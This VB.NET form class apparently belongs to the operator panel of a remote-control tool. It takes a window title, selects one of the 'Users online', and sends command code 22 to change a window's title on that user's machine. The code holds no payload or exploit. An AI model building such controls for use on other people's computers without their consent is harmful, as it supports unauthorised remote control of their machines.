Public Class WindowmanagerTitleChanger

    Private Sub ButtonChangeTitle_Click(sender As Object, e As EventArgs) Handles ButtonChangeTitle.Click
        Settings.AddLog("Pending", Settings.State.Pending, "Changing window title...")
        If TextBoxWindowTitle.Text.Contains(";") Then
            MsgBox("You can't use ';' in the window title.", MsgBoxStyle.Exclamation)
            Exit Sub
        End If
        If Main.ListViewMain.Items.Count > 0 Then
            If Main.ListViewMain.SelectedItems.Count <> 0 Then _
                Main.SelectedUserID = Main.ListViewMain.SelectedItems(0).Text
        Else
            MsgBox("No Users online.", MsgBoxStyle.Exclamation)
        End If
        Try
            Main.WriteData(Windowmanager.ListViewWindows.SelectedItems(0).Text & ";;;" & TextBoxWindowTitle.Text)
            Main.WriteCommand(Main.SelectedUserID & "|22")
            Using dialog As New Waiting()
                dialog.ShowDialog()
            End Using
            Me.Close()
        Catch x As Exception
            MsgBox("Unable to Send Command." & x.Message, MsgBoxStyle.OkOnly, "WindowTitleChanger")
        End Try
    End Sub

End Class